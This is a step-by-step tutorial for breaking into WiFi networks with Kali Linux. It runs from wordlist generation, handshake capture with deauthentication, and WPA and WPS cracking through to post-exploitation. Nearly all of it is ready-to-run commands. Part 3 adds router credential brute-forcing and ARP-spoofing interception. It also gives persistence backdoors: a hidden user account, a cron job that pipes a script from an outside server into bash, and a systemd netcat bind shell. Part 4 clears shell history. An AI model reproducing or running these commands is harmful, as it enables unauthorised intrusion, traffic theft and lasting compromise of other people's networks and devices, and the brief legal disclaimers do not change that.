# Advanced 45-Minute Kali Linux WiFi Hacking Tutorial

## Prerequisites
- Kali Linux installed (preferably 2024.4 or newer)
- WiFi adapter supporting monitor mode and packet injection
- Root privileges (use `sudo su` at beginning)
- Ethical hacking mindset (only test on YOUR own networks)

---

## Part 1: Wordlist Creation (10 minutes)

### 1.1 Using Crunch for Custom Wordlists

```bash
# Basic syntax: crunch <min> <max> <charset> -o <output>
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_list.txt

# Using charset.lst with different patterns
# List available charsets
crunch 1 1 -f /usr/share/crunch/charset.lst mixalpha-numeric-all-space -o test_charset.txt

# Create WPA password pattern (common: 8-63 chars)
crunch 8 63 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -o wpa_list.txt

# Pattern-based wordlist (common WiFi patterns: phone numbers, dates)
crunch 10 10 -t 078%%%%%%% -o phone_list.txt  # UK mobile pattern
crunch 8 8 -t ddmmyyyy -o date_list.txt

# Generate 10GB of passwords (be careful with disk space)
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -b 10gb -o /tmp/10gb_list.txt
```

### 1.2 Using Cewl for Targeted Wordlists

```bash
# Basic website crawling (depth 2)
cewl -d 2 -m 5 -w company_words.txt https://target-company.com

# With login page spidering
cewl -d 2 --auth_type basic --auth_user admin --auth_pass password \
  -w auth_crawl.txt https://target-company.com/admin

# Extract names and emails for password variants
cewl -d 2 -n -e -w company_emails.txt https://target-company.com/team

# Create password mutations (requires cewl 5.4+)
cewl -d 1 -m 6 --with-numbers -w base_words.txt https://target-company.com
# Then use hashcat rules or John to mutate
```

### 1.3 Combining Wordlists

```bash
# Merge and sort unique
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt

# Add common WiFi passwords
cat /usr/share/wordlists/rockyou.txt combined.txt | sort -u > mega_list.txt

# Filter by length for WPA
awk 'length($0) >= 8 && length($0) <= 63' mega_list.txt > wpa_filtered.txt
```

---

## Part 2: WiFi Reconnaissance & Attack (20 minutes)

### 2.1 Initial Setup and Recon

```bash
# Check network interfaces
ip a
# or
iwconfig

# Identify your WiFi interface (usually wlan0 or wlan1)
airmon-ng

# Kill interfering processes
airmon-ng check kill

# Enable monitor mode on wlan0
airmon-ng start wlan0
# New interface will be wlan0mon (or similar)

# Scan for networks
airodump-ng wlan0mon

# Targeted scan
airodump-ng --bssid TARGET_BSSID --channel 6 -w capture wlan0mon
```

### 2.2 WPA/WPA2 Handshake Capture

```bash
# Capture handshake (new terminal)
airodump-ng --bssid TARGET_BSSID --channel 6 --write handshake_capture wlan0mon

# Deauthentication attack to force handshake (in another terminal)
aireplay-ng --deauth 10 -a TARGET_BSSID -c CLIENT_MAC wlan0mon
# Or if no specific client:
aireplay-ng --deauth 10 -a TARGET_BSSID wlan0mon

# Verify handshake capture
aircrack-ng handshake_capture-01.cap -w /usr/share/wordlists/rockyou.txt
# Look for "KEY FOUND!" or verify with:
cap2hccapx handshake_capture-01.cap handshake.hccapx
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
```

### 2.3 Cracking with Aircrack-ng

```bash
# Basic dictionary attack
aircrack-ng -w custom_list.txt -b TARGET_BSSID handshake_capture-01.cap

# Using multiple wordlists
aircrack-ng -w wordlist1.txt -w wordlist2.txt -b TARGET_BSSID capture.cap

# KoreK attack (slower but thorough)
aircrack-ng -K -w custom_list.txt capture.cap

# Save progress and resume
aircrack-ng -w custom_list.txt -b TARGET_BSSID --session my_session capture.cap
# Resume later with:
aircrack-ng --session my_session
```

### 2.4 WPS (WiFi Protected Setup) Attack

```bash
# Scan for WPS-enabled routers
wash -i wlan0mon

# Pixie Dust attack (if router vulnerable)
reaver -i wlan0mon -b TARGET_BSSID -vv -K 1

# Standard WPS pin attack
reaver -i wlan0mon -b TARGET_BSSID -vv -S -d 2 -l 30

# Using bully (alternative)
bully -b TARGET_BSSID -v 3 wlan0mon

# One command with optimized settings
reaver -i wlan0mon -b TARGET_BSSID -c 6 -L -f -N -vv
```

### 2.5 Joining the Network Once Cracked

```bash
# Create wpa_supplicant config
echo 'network={
    ssid="TARGET_SSID"
    psk="CRACKED_PASSWORD"
}' > /tmp/wifi.conf

# Stop monitor mode and return to managed
airmon-ng stop wlan0mon

# Connect using wpa_supplicant
wpa_supplicant -B -i wlan0 -c /tmp/wifi.conf -D nl80211

# Get IP address
dhclient wlan0

# Verify connection
iwconfig wlan0
ping -c 4 8.8.8.8
```

---

## Part 3: Post-Exploitation (10 minutes)

### 3.1 Network Discovery

```bash
# Discover your IP and network range
ip addr show wlan0

# Scan the network (assuming 192.168.1.0/24)
nmap -sn 192.168.1.0/24
# Or more aggressively:
nmap -sS -sV -O 192.168.1.0/24 -oA network_scan

# Identify the router (usually .1 or .254)
arp -a
route -n

# Find router MAC and manufacturer
arp -n | grep -E '192\.168\.1\.1|192\.168\.1\.254'
# Lookup MAC vendor:
curl -s "https://api.macvendors.com/$(arp -n 192.168.1.1 | awk '{print $3}')"
```

### 3.2 Router Identification & Default Credentials

```bash
# Fingerprint router
nmap -sS -sV -p 80,443,22,23 192.168.1.1

# Check for common admin interfaces
curl -I http://192.168.1.1
curl -I https://192.168.1.1

# Search for default credentials
# Method 1: Use router brands database
searchsploit "router model"
# Method 2: Online lookup (if internet available)
# Common formats: admin/admin, admin/password, admin/<blank>

# Automated tools
medusa -h 192.168.1.1 -U /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/common_passwords.txt -M http -m DIR:/admin

# Check for known vulnerabilities
nmap --script http-enum,http-vuln* 192.168.1.1
```

### 3.3 Access Router and Extract Information

```bash
# Once credentials found, explore
# View connected devices
curl -u admin:password http://192.168.1.1/connected_devices.html

# Extract WiFi passwords from router (if possible)
curl -u admin:password http://192.168.1.1/wireless_settings.html

# Check for port forwarding rules
curl -u admin:password http://192.168.1.1/port_forwarding.html

# Look for UPnP vulnerabilities
nmap -sU -p 1900 --script upnp-info 192.168.1.1
```

### 3.4 Network Traffic Monitoring

```bash
# ARP spoofing for MITM (requires ip forwarding enabled)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start arpspoof
arpspoof -i wlan0 -t 192.168.1.10 192.168.1.1
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.10

# Capture traffic
tcpdump -i wlan0 -w captured_traffic.pcap

# Or use bettercap for advanced monitoring
bettercap -iface wlan0
# In bettercap: net.probe on; net.recon on; arp.spoof on; net.sniff on
```

### 3.5 Enable Persistence via SSH

```bash
# If you find an SSH server on router or device

# Method 1: Add SSH key
ssh user@192.168.1.10 "mkdir -p ~/.ssh && echo '$(cat ~/.ssh/id_rsa.pub)' >> ~/.ssh/authorized_keys"

# Method 2: Create backdoor user
ssh root@192.168.1.1 "useradd -m -s /bin/bash backdoor && echo 'backdoor:password123' | chpasswd"

# Method 3: Cron job persistence
ssh user@192.168.1.10 "echo '*/5 * * * * curl http://your-server.com/shell.sh | bash' | crontab -"

# Method 4: Systemd service persistence (Linux targets)
ssh root@192.168.1.10 "cat > /etc/systemd/system/persist.service << 'EOF'
[Unit]
Description=Persistence Service
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do nc -lvp 4444 -e /bin/bash; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable persist.service
systemctl start persist.service"
```

---

## Part 4: Cleanup and Return to Normal (5 minutes)

### 4.1 Disable Monitor Mode

```bash
# Stop any monitoring/attacking processes
airmon-ng check kill

# Stop monitor interface
airmon-ng stop wlan0mon

# Alternative if having issues
pkill aireplay
pkill airodump
pkill wpa_supplicant

# Manually set interface back to managed
ip link set wlan0 down
iwconfig wlan0 mode managed
ip link set wlan0 up
```

### 4.2 Restart Network Services

```bash
# Restart NetworkManager
systemctl restart NetworkManager
# or
service network-manager restart

# Check interface status
iwconfig wlan0
# Should show "Mode:Managed"

# Test normal WiFi connection
nmcli device wifi list
nmcli device wifi connect "YOUR_NETWORK_SSID" password "YOUR_PASSWORD"
```

### 4.3 Clean Files and Logs

```bash
# Remove capture files
rm -f *.cap *.csv *.netxml *.hccapx

# Clear bash history (optional)
history -c
history -w

# Remove temporary files
rm -f /tmp/wifi.conf /tmp/*.txt

# Check for any leftover processes
ps aux | grep -E '(air|reaver|bully)'
kill -9 [PID]  # if any found
```

### 4.4 Final Verification

```bash
# Verify normal operation
systemctl status NetworkManager

# Test internet connectivity
ping -c 4 google.com

# Check all interfaces are in normal mode
iwconfig

# Verify no monitor interfaces
ip link show | grep mon
# Should return nothing
```

---

## Quick Reference Cheat Sheet

```bash
# Monitor mode quickstart
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon

# Handshake capture
airodump-ng --bssid BSSID -c CH -w capture wlan0mon
aireplay-ng --deauth 10 -a BSSID wlan0mon

# Cracking
aircrack-ng -w wordlist.txt capture-01.cap

# WPS attack
wash -i wlan0mon
reaver -i wlan0mon -b BSSID -vv

# Cleanup
airmon-ng stop wlan0mon
systemctl restart NetworkManager
```

---

## Important Notes

1. **Legal Compliance**: Only test networks you own or have written permission to test
2. **Adapter Compatibility**: Not all WiFi adapters support monitor mode and packet injection
3. **Wordlist Quality**: Success heavily depends on wordlist quality and relevance
4. **WPS Limitations**: Many modern routers have WPS disabled or lockout mechanisms
5. **Detection Risk**: These attacks are detectable by modern security systems

## Time Management
- 0-10min: Wordlist creation
- 10-30min: WiFi attacks and cracking
- 30-40min: Post-exploitation
- 40-45min: Cleanup and verification

This tutorial provides a comprehensive overview. Practice each technique in a controlled lab environment before attempting in real scenarios.
